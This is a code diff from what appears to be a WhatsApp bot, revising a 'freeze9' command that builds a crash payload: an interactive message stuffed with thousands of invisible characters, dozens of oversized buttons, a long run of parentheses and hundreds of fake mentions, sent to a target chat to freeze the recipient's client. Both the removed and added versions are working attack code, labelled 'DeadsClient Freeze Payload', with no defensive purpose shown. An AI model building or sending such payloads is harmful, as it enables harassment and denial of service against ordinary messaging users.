@@ -14765,76 +14765,52 @@ case "freeze9": {
     const target = msg.key.remoteJid;
 
     try {
-        const ButtonsQPay = [];
+        const buttons = [];
 
-        // Erster großer Button
-        ButtonsQPay.push({
+        // Großer Single Select Button
+        buttons.push({
             name: "single_select",
             buttonParamsJson: JSON.stringify({
-                title: "\u200E".repeat(8000),
+                title: "\u200E".repeat(7500),
                 sections: [{ title: "\u200E", rows: [] }]
             })
         });
 
-        // Viele Buttons für den Crash-Effekt
-        for (let i = 0; i < 40; i++) {
-            ButtonsQPay.push(
-                { 
-                    name: "cta_call", 
-                    buttonParamsJson: JSON.stringify({ status: true }) 
-                },
+        // Viele Crash-Buttons
+        for (let i = 0; i < 35; i++) {
+            buttons.push(
+                { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
                 { 
                     name: "cta_copy", 
-                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2500) }) 
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2200) }) 
                 },
                 { 
                     name: "quick_reply", 
-                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2500) }) 
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2200) }) 
                 }
             );
         }
 
         const messageContent = {
-            viewOnceMessage: {
-                message: {
-                    messageContextInfo: {
-                        deviceListMetadata: {},
-                        deviceListMetadataVersion: 2
-                    },
-                    interactiveMessage: {
-                        header: {
-                            title: "☠️ DeadsClient Freeze 🔥",
-                            hasMediaAttachment: false
-                        },
-                        body: {
-                            text: "☠️DeadsClient 🔥 Freeze Payload"
-                        },
-                        footer: {
-                            text: "."
-                        },
-                        contextInfo: {
-                            participant: target,
-                            mentionedJid: [
-                                "0@s.whatsapp.net",
-                                ...Array.from({ length: 600 }, () => 
-                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-                                )
-                            ],
-                            isForwarded: true,
-                            forwardingScore: 999
-                        },
-                        nativeFlowMessage: {
-                            buttons: ButtonsQPay,
-                            messageParamsJson: "(".repeat(3000)
-                        }
-                    }
-                }
+            text: "☠️ DeadsClient Freeze 🔥",
+            footer: "Freeze Payload",
+            nativeFlowMessage: {
+                buttons: buttons,
+                messageParamsJson: "(".repeat(2800)
+            },
+            contextInfo: {
+                mentionedJid: [
+                    "0@s.whatsapp.net",
+                    ...Array.from({ length: 500 }, () => 
+                        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                    )
+                ],
+                isForwarded: true,
+                forwardingScore: 999
             }
         };
 
-        await sock.sendMessage(target, messageContent, { 
-            timestamp: new Date() 
-        });
+        await sock.sendMessage(target, messageContent);
 
         console.log(`✅ Freeze9 gesendet an ${target}`);
 
